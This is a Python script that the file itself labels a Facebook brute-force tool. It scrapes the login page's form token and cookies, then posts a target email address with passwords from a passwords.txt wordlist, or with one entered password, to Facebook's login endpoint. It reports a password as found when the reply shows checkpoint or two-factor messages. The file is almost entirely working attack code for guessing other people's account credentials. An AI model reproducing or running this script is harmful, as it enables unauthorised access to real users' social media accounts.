import requests
import sys
import time
from bs4 import BeautifulSoup
from colorama import Fore, init
from termcolor import colored
init()

# Facebok Class
class Facebook:
    # attribute
    url = 'https://web.facebook.com/login.php'
    headers = {
	    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.320',
    }
    payload = {}
    cookies = {}
    typeExec = ''
    account = {
        'email': '',
        'password': ''
    }
    # init
    def __init__(self, Email, TypeExecute, Password = ''):
        if '@gmail.com' in Email or '@yahoo.com' in Email or '@' in Email and '.' in Email:
            if TypeExecute == 'manual':
                if len(Password) < 6:
                    sys.exit()
            self.typeExec = TypeExecute
            self.account['email'] = Email
            self.account['password'] = Password
            print(colored('Start Facebook Bruteforce', 'blue'))
            print('.....5%')
            time.sleep(1)
            print('..........15%')
            time.sleep(1)
            print('...............25%')
            time.sleep(1)
            print('....................35%')
            time.sleep(1)
            print('.........................45%')
            time.sleep(1)
            print('..............................55%')
            time.sleep(1)
            print('...................................75%')
            time.sleep(1)
            print('........................................85%')
            time.sleep(1)
            print('.............................................90%')
            time.sleep(1)
            print('..................................................100%')
            time.sleep(1)
            print('')
        else:
            sys.exit()
    def CreateForm(self):
        form = dict()
        self.cookies = {
            'fr' : '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'
        }
        data = requests.get(self.url,headers = self.headers)
        # 200
        if data.status_code == 200:
            for i in data.cookies:
                self.cookies[i.name] = i.value
            data = BeautifulSoup(data.text,'html.parser').form
            if data.input['name'] == 'lsd':
                form['lsd'] = data.input['value']
            return (form,self.cookies)
        # 404/500/403
        else:
            sys.exit()
    def run(self):
        self.CreateForm()
        def postdata(email, password):
            self.payload['email']   = email
            self.payload['pass']    = password
            ReqPost = requests.post(self.url, data = self.payload, cookies = self.cookies, headers = self.headers)
            if 'Aktivitas terbaru mungkin mempengaruhi keamanan akun Anda' in ReqPost.text or 'Recent activity might affect the security of your account' in ReqPost.text or 'Two-factor authentication required' in ReqPost.text or 'Harap Konfirmasikan Identitas Anda' in ReqPost.text:
                print('Message: Password Is : ', password)
                sys.exit()
                return True
            if 'Email yang Anda masukkan tidak cocok dengan akun mana saja. Buat sebuah akun.' in ReqPost.text:
                print('Message: Email Not Registry. Register Now In https://web.facebook.com/r.php')
                sys.exit()
            if 'Permintaan Anda tidak dapat diproses' in ReqPost.text:
                print(colored("Message: Sorry This Account Can't Be Process In Backend.", "white", "on_red", attrs=["bold"]))
            else:
                return False
        # using txt file
        if(self.typeExec == 'auto'):
            file = open('passwords.txt', 'r')
            i = 0
            for data in file:
                i += 1
                print('Password ' + str(i) + ' : ', hash(data))
                postdata(self.account['email'], data)
        if(self.typeExec == 'manual'):
            # using password
            email = self.account['email']
            password = self.account['password']
            if len(password) != 0 and len(password) >= 6:
                if postdata(email, password) == False:
                    again = str(input('Password Is Wrong. Do You Want To Try Again (Y/N) ? '))
                    if again == 'Y' or again == 'y':
                        self.run()
            else:
                print('Password Must Be Length More 6')
                sys.exit()